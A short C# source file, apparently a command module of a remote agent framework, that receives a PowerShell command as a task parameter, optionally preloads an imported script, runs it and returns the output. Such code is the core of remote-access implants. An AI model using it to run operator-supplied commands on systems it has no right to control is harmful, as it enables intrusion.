using Agent.Commands.Execution;
using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class PowerShellCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Powershell;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.Command);

            string command = task.GetParameter<string>(ParameterId.Command);
            using (var runner = new PowerShellRunner())
            {
                if (!string.IsNullOrEmpty(PowerShellImportCommand.Script))
                    runner.ImportScript(PowerShellImportCommand.Script);

                context.AppendResult(runner.Invoke(command));
            }
        }
    }
}
